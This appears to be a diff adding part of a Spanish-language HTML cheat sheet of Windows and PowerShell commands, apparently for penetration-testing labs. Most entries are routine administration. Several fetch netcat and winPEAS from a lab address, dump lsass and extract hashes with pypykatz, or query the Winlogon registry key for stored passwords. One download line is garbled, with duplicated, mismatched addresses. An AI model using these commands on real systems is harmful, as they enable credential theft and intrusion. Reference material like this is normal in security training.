+                    <div class="etiqueta">
+                        Elimina archivos o carpetas.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Remove-Item -Path C:\ruta\archivo.txt" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Descarga archivos o contenido desde la web.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Invoke-WebRequest -Uri https://www.ejemplo.com/archivo.zip -OutFile archivo.zip" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Descripción: Utiliza PowerShell para descargar un archivo llamado "nc.exe" desde la URL "http://10.10.14.10/nc.exe" y lo guarda en la ruta "C:\Windows\Temp\nc.exe".
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="powershell IWR -uri http://10.10.14.10/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra historial de comandos previamente ejecutados.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="doskey /history" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Quita las líneas con hashtag de un archivo.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Get-Content archivo | Select-String -NotMatch &quot;^#&quot;" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Aplica una búsqueda por una palabra clave a un archivo ".bak".
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Select-String &quot;Logon failed&quot; ERRORLOG.BAK" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Otorga permisos de ejecución para todos los usuarios a un archivo.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="icacls .\nc64.exe /grant Everyone:F" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Otorga permisos completos a un usuario sobre un ejecutable.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="icacls nc.exe /F /G ginawild:F" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Crea una Alternative Data Stream (ADS) con un nombre igual a uno existente.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="echo hola > test.txt:EstsEsMiADS.txt" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra el contenido de un Alternative Data Stream (ADS).
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="more < hm.txt:root.txt" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Convierte un archivo en base64.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="$b64 = [Convert]::ToBase64String([IO.FILE]::ReadAllBytes(&quot;CVE.pdf&quot;))" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Descarga un archivo desde un servidor la web (10.10.14.10).
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="powershell &quot;Invoke-WebRequest -UseBasicParsing 10.10.14.27/winPEASx64.exe -OutFile winPeas.exe&quot;"Invoke-WebRequest -UseBasicParsing 10.10.14.10/winPEASx64.exe -OutFile winPeas.exe"" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra las reglas de firewall implementadas.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Get-NetFirewallRule -PolicyStore ActiveStore" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra los bloqueos aplicados por el firewall.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Get-NetFirewallRule -PolicyStore ActiveStore | Where-Object {$_.Action -eq &quot;Block&quot;}" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra un resumen de los bloqueos por el firewall.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Get-NetFirewallRule -PolicyStore ActiveStore | Where-Object {$_.Action -eq &quot;Block&quot;} | Select-Object DisplayName" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra el programa dentro de una regla de firewall filtrado por su ID.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Get-NetFirewallRule -PolicyStore ActiveStore -Name &quot;{D7871DF0-F71B-4BD0-B7DE-F8E6966A3640}&quot; | Get-NetFirewallApplicationFilter" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Lista los puertos en uso.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="netstat -nat" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Lista información descriptiva de los puertos.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Get-NetTCPConnection | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}}" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Filtra información específica sobre puertos abiertos.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Get-NetTCPConnection -State Listen | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}} | Format-Table -Property LocalAddress,LocalPort,ProcessName" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra información detallada sobre los procesos en ejecución.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Get-Process | Where-Object { $_.WorkingSet -gt 100MB }" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Accede a registros de eventos del sistema.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Get-EventLog -LogName Application -Newest 10" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Realiza un volcado de información de un proceso (requiere un ID de proceso).
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="./procdump64.exe -accepteula -ma 56809" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra hashes contenidos en un archivo (requiere un archivo de minidump).
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="pypykatz lsa minidump lsass.DMP" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Crea una unidad que se sincroniza con la unidad C del disco de una máquina remota.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="use z: \\NombreMáquina\C$" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Accede a la unidad Z creada previamente.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="z:" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra el contenido de un registro que suele almacenar contraseñas.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Checa el registro para un servicio (WUServer).
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra registros relacionados a un servicio.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Realiza ping a una dirección IP o nombre de host.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Test-Connection -ComputerName google.com" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Controla la ejecución de scripts en PowerShell.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Set-ExecutionPolicy RemoteSigned" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Crea una tarea programada.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Register-ScheduledTask -TaskName "MiTarea" -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute &quot;C:\mi_script.ps1&quot;)" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="blog-image-grande">
+                    <img src="media/windows3.jpg" alt="">
+                </div>
+            </div>   
+    </main>
+    <script src="../js/script.js"></script>
+</body>
+</html>
